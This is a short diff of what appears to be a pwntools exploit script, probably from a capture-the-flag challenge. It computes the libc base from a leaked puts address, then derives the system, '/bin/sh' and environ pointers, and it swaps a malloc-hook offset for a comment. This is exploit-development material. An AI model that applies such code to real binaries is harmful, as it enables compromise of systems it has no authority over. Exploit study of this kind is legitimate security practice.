@@ -49,7 +49,8 @@ def pwn():
 	libc     = puts - puts_off
 	system   = libc + sys_off
 	binsh    = libc + sh_off
-	mhook    = libc + 0x3c2740
+	# There is an address in libc which contains the
+	# address of the environment variable array
 	env_libc = libc + 0x3c54a0
 
 	log.success("Leak:    0x{:x}".format(puts))
